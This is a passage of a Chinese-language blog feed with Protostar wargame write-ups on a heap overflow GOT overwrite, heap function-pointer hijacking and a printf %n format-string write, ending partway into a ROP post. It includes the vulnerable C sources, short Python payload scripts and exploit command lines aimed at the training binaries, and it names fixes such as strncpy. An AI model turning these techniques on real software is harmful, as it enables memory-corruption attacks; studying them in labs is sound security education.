 <span class="built_in">printf</span>(<span class="string">"and that's a wrap folks!\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-简单的分析-amp-思考"><a href="#0x02-简单的分析-amp-思考" class="headerlink" title="0x02 简单的分析&amp;思考"></a>0x02 简单的分析&amp;思考</h2><p>如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个<code>strcpy</code>，肯定是要去覆盖和修改某个地方的地址。<br>其实<code>strcpy</code>这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。<br>在这个列子中，我们就借此去修改<code>printf</code>函数的GOT表。</p><h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>1.查看堆分配情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/0-0.png?raw=true" alt="0-0"><br>2.查看汇编代码，找到执行入口<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/0-1.png?raw=true" alt="0-1"><br>3.首先利用第一个<code>strcpy</code>将i2的name指针改为GOT表地址，然后利用第二个<code>strcpy</code>向这个地址写入<code>winner</code>的地址，由此编写对应的Python PoC</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">padding = <span class="string">"AAAA"</span>*<span class="number">5</span></div><div class="line">put_got = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8049774</span>) <span class="meta">#put的GOT表地址</span></div><div class="line">space = <span class="string">" "</span></div><div class="line">winner = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8048494</span>) <span class="meta">#winner函数地址</span></div><div class="line"><span class="built_in">print</span> padding+put_got+space+winner</div></pre></td></tr></table></figure><p>4.hack</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user@protostar<span class="symbol">:/tmp</span>$ /opt/protostar/bin/heap1 <span class="string">`python  heap1.py`</span></div><div class="line"><span class="keyword">and</span> we have a winner @ <span class="number">1492452139</span></div></pre></td></tr></table></figure><p><strong>成功执行winner函数</strong></p><h1 id="0x04-一点感受"><a href="#0x04-一点感受" class="headerlink" title="0x04 一点感受"></a>0x04 一点感受</h1><p>学到现在，感受很多，对用户输入的数据完全信任是多么的可怕。可能有一万种的方法去利用这个漏洞达到代码执行。比如这里，将<code>strcpy</code>改为<code>strncpy</code>或者在copy前先检查下长度的话就能避免。所以写好一个有质量的代码是多么重要。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。&lt;/p&gt;
&lt;/blo
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="堆溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
      <category term="strcpy" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/strcpy/"/>
    
      <category term="GOT表" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/GOT%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-堆溢出学习-覆盖堆函数指针劫持代码流</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/18/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/18/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/</id>
    <published>2017-04-18T03:12:19.000Z</published>
    <updated>2017-05-02T14:34:15.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><p><code>C代码</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> data &#123;</div><div class="line">  <span class="keyword">char</span> name[<span class="number">64</span>];</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> fp &#123;</div><div class="line">  <span class="keyword">int</span> (*fp)();</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"level passed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">nowinner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"level has not been passed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> data *d;</div><div class="line">  <span class="keyword">struct</span> fp *f;</div><div class="line"></div><div class="line">  d = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> data));</div><div class="line">  f = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> fp));</div><div class="line">  f-&gt;fp = nowinner;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"data is at %p, fp is at %p\n"</span>, d, f);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(d-&gt;name, argv[<span class="number">1</span>]);</div><div class="line">  </div><div class="line">  f-&gt;fp();</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>先在堆上分配了一个data和fp的结构体，然后使fp指向<code>nowinner</code>函数，然后打印对应分配的堆地址，以及将<code>argv[1]</code>复制到data结构体，最后调用<code>nowinner</code>函数。</p><p>可以知道我们需要去执行<code>winner</code>函数，怎么做到呢？</p><p>由于<code>strcpy</code>没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为<code>winner</code>函数？Here we go！</p><h2 id="0x03-malloc"><a href="#0x03-malloc" class="headerlink" title="0x03 malloc()"></a>0x03 malloc()</h2><p>在继续分析之前，我们先来简单的介绍一下<code>malloc</code>函数，在这里<code>malloc</code>函数更多是对<code>mmap</code>系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用<code>mmap</code>来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。</p><p>那是如何管理堆的呢？见下</p><table><thead><tr><th>堆标志</th><th>分配大小</th><th>malloc返回地址addr</th></tr></thead><tbody><tr><td>00000000</td><td>00000011</td><td>00000000 00000000</td></tr><tr><td>00000000</td><td>00000031</td><td>AAAAAAAA BBBBBBBB</td></tr><tr><td>CCCCCCCC</td><td>DDDDDDDD</td><td>EEEEEEEE FFFFFFFF</td></tr><tr><td>…</td><td>…</td><td>…       …</td></tr><tr><td>00000000</td><td>00000011</td><td>00000000 00000000</td></tr></tbody></table><p>每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过<code>addr-4</code>拿到自身的分配大小从而决定下次分配的选择</p><p><strong>注：分配大小的第一位表示前面的内存块是否在使用</strong></p><h2 id="0x04-调试-amp-hack"><a href="#0x04-调试-amp-hack" class="headerlink" title="0x04 调试&amp;hack"></a>0x04 调试&amp;hack</h2><p>通过前面的分析，我们的目的很明确，需要通过<code>strcpy(d-&gt;name, argv[1]);</code>去重写fp结构体里面的函数指针，使其为<code>winner</code>函数的地址。</p><p>1.利用gdb查看strcpy前后堆的情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-0.png?raw=true" alt="0-0"><br>我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的<code>nowinner</code>地址改为<code>winner</code>地址</p><p>2.查看<code>winner</code>地址，重写fp函数指针</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) p winner </div><div class="line">$<span class="number">1</span> = &#123;<span class="keyword">void</span> (<span class="keyword">void</span>)&#125; <span class="number">0x8048464</span> &lt;winner&gt;</div></pre></td></tr></table></figure><p>3.PoC Python脚本</p><figure class="highlight golo"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">padding = <span class="string">"A"</span>*<span class="number">64</span> <span class="comment">#填充data</span></div><div class="line">head = <span class="string">"BBBB"</span>  <span class="comment"># not care</span></div><div class="line">head += <span class="string">"CCCC"</span> <span class="comment"># not care</span></div><div class="line">winner = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8048464</span>) <span class="comment">#将nowinner地址改为winner地址</span></div><div class="line"><span class="keyword">print</span> padding+head+winner</div></pre></td></tr></table></figure><p>4.hack<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-1.png?raw=true" alt="0-1"><br>成功执行<code>winner</code>函数!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="堆溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-栈溢出学习-printf格式%n任意地址写</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/17/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/17/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/</id>
    <published>2017-04-17T03:12:19.000Z</published>
    <updated>2017-05-02T14:34:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p>从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">int</span> target;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="built_in">string</span>);</div><div class="line">  </div><div class="line">  <span class="keyword">if</span>(target) &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  vuln(argv[<span class="number">1</span>]);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-疑惑-amp-分析-amp-思考"><a href="#0x02-疑惑-amp-分析-amp-思考" class="headerlink" title="0x02 疑惑&amp;分析&amp;思考"></a>0x02 疑惑&amp;分析&amp;思考</h2><p>拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量<strong>target</strong>的值。但好像除了<code>printf()</code>函数，就没有其他可疑的地方了。what fuck？ 一个<code>printf()</code>函数怎么会有漏洞？</p><p>但仔细观察可以发现这次<code>printf</code>的用法有点奇怪，直接打印一个字符串地址，很少会这样用，会不会就是这里？？？</p><h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>其他不说，先运行下程序试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-1.png?raw=true" alt="0-1"><br>再试着输入格式字符试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-2.png?raw=true" alt="0-2"><br>很奇怪，我们貌似得到一些栈中的值，再多打印一些试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-3.png?raw=true" alt="0-3"><br>可以看到后面打印出来了%x本身&lt;—<code>20782520</code>，通过linux stack layout可得知后面的确保存着参数字符串</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">local <span class="keyword">variables</span> of <span class="comment">main</span></div><div class="line">saved <span class="comment">registers of main</span></div><div class="line">return <span class="comment">address of main</span></div><div class="line">argc</div><div class="line">argv</div><div class="line">envp</div><div class="line">stack <span class="comment">from startup code</span></div><div class="line">argc</div><div class="line">argv <span class="comment">pointers</span></div><div class="line">NULL <span class="comment">that ends argv[]</span></div><div class="line">environment <span class="comment">pointers</span></div><div class="line">NULL <span class="comment">that ends envp[]</span></div><div class="line">ELF <span class="comment">Auxiliary Table</span></div><div class="line">argv <span class="comment">strings              &lt;--------focus here</span></div><div class="line">environment <span class="comment">strings</span></div><div class="line">program <span class="comment">name</span></div><div class="line">NULL</div></pre></td></tr></table></figure><p><a href="http://www.win.tue.nl/~aeb/linux/hh/stack-layout.html" target="_blank" rel="external">更多关于linux栈布局</a></p><h2 id="0x04-你不知道的printf"><a href="#0x04-你不知道的printf" class="headerlink" title="0x04 你不知道的printf"></a>0x04 你不知道的printf</h2><p>虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？</p><p>关注printf函数，有这么一段话：</p><ul><li>Code  such  as  printf(foo);  often indicates a bug, since foo may contain a % character.  If foo comes from untrusted user input, it may contain %n,causing the printf() call to write to memory and creating a security hole.</li></ul><p>简单就是说%n可以写入一个内存地址，其值为前面的字符数</p><ul><li>[n]The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument.  No argument is con‐verted.</li></ul><p>看个例子<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-4.png?raw=true" alt="0-4"><br>这样的话就可以满足写入的问题了，现在的问题就是写入哪里，怎么写了</p><h2 id="0x05-hack"><a href="#0x05-hack" class="headerlink" title="0x05 hack"></a>0x05 hack</h2><p>先利用<code>objdump -t</code>找到<code>target</code>的地址<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-5.png?raw=true" alt="0-5"><br>利用一句话Python反复测试<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/protostar/bin/format<span class="number">1</span>  <span class="string">"`python -c 'print "</span>A<span class="string">"*4 + "</span>\<span class="keyword">x</span><span class="number">38</span>\<span class="keyword">x</span><span class="number">96</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span><span class="string">" + "</span>BBB<span class="string">"+"</span><span class="symbol">%x</span> <span class="string">"*135"</span>'`<span class="string">"</span></div></pre></td></tr></table></figure></p><p>调整%x的个数，使其target地址为最后一个<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-6.png?raw=true" alt="0-6"><br>然后将最后一个%x改为%n<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/protostar/bin/format<span class="number">1</span>  <span class="string">"`python -c 'print "</span>A<span class="string">"*4 + "</span>\<span class="keyword">x</span><span class="number">38</span>\<span class="keyword">x</span><span class="number">96</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span><span class="string">" + "</span>BBB<span class="string">"+"</span><span class="symbol">%x</span> <span class="string">"*134+"</span><span class="symbol">%n</span> <span class="string">"'`"</span></div></pre></td></tr></table></figure></p><p>run!<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-7.png?raw=true" alt="0-7"><br><strong>成功修改target值!</strong></p><h2 id="0x06-一点感悟"><a href="#0x06-一点感悟" class="headerlink" title="0x06 一点感悟"></a>0x06 一点感悟</h2><p>总的来说，自己受到了一点震感。So amazing！没想到一个printf使用不当就可能造成这么严重的漏洞。继续学习吧！</p><h2 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h2><ul><li><p><a href="http://www.win.tue.nl/~aeb/linux/hh/stack-layout.html" target="_blank" rel="external">更多关于linux栈布局</a></p></li><li><p><a href="http://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c" target="_blank" rel="external">What is the use of the %n format specifier in C?</a></p></li><li><a href="http://liveoverflow.com/binary_hacking/protostar/format1.html" target="_blank" rel="external">Protostar/Format 1</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="printf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/printf/"/>
    
      <category term="format" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/format/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-栈溢出学习-ROP执行shellcode</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/16/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/16/Protostar-栈溢出系列学习-Stack 3/Protostar-栈溢出系列学习-Stack 3/</id>
    <published>2017-04-16T03:12:19.000Z</published>
    <updated>2017-05-02T14:33:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存放的shellcode。这次，我们做了一些栈上的限制，比如现在的操作体系都会有DSP，ASLR等保护。本文就借此来学习一些ROP的知识。</p></blockquote><h2 id="0x01-stack3"><a href="#0x01-stack3" class="headerlink" title="0x01 stack3"></a>0x01 stack3</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">getpath</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ret;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"input path please: "</span>); fflush(<span class="built_in">stdout</span>);</div><div class="line"></div><div class="line">  gets(buffer);</div><div class="line"></div><div class="line">  ret = __builtin_return_address(<span class="number">0</span>);</div><div class="line"></div><div class="line">  <span class="keyword">if</span>((ret &amp; <span class="number">0xbf000000</span>) == <span class="number">0xbf000000</span>) &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"bzzzt (%p)\n"</span>, ret);</div><div class="line">      _exit(<span class="number">1</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"got path %s\n"</span>, buffer);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">  getpath();</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-思路-amp-分析"><a href="#0x02-思路-amp-分析" class="headerlink" title="0x02 思路&amp;分析"></a>0x02 思路&amp;分析</h2><p>整体上和前面的没太大区别，现在有个问题在于<code>__builtin_return_address()</code>会返回当前的返回地址值，然后后面<code>ret &amp; 0xbf000000) == 0xbf000000</code>对其返回地址进行了限制–返回地址不能是<code>0xbf</code>为前缀，正好是栈的前缀。这样的话就不能像之前那样直接返回到栈中，也不能执行栈上的shellcode。</p><p>怎么绕过呢？</p><p><strong>Ret2libc or ROP(return orientated programming)</strong></p><h2 id="0x03-ROP"><a href="#0x03-ROP" class="headerlink" title="0x03 ROP"></a>0x03 ROP</h2><p>一个巧妙的方法在于我们不直接返回到栈中执行shellcode，而是返回到原本的程序之中。这里我们返回到<code>getpath()</code>的ret指令处。在后面在存放shellcode，而再次执行ret时就会跳转到后面执行我们的shellcode。</p><h3 id="getpath-汇编"><a href="#getpath-汇编" class="headerlink" title="getpath()汇编"></a>getpath()汇编</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function getpath:</div><div class="line"><span class="number">0x08048484</span> &lt;getpath+<span 